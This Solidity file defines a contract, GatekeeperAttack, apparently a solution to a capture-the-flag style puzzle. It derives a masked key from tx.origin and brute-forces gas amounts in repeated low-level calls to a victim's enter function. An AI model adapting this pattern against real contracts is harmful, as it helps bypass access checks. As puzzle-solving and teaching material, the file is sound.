pragma solidity ^0.5;

contract GatekeeperAttack {
  address internal victim;

  constructor (address _address) public {
    victim = _address;
  }

  function hack() public returns (bool) {
    address gateKey = tx.origin;
    bytes8 gateKey8 = bytes8(uint64(gateKey));
    bytes8 mask = 0xFFFFFFFF0000FFFF;
    bytes8 gateKeyPadded = gateKey8 & mask;

    bytes memory encodedParams = abi.encodeWithSelector(bytes4(keccak256("enter(bytes8)")), gateKeyPadded);

    for (uint256 i = 0; i < 120; i++) {
      (bool result, bytes memory data) = victim.call.gas(i + 150 + 8191 * 4)(encodedParams);
      if (result) {
          return result;
      }
    }
  }
}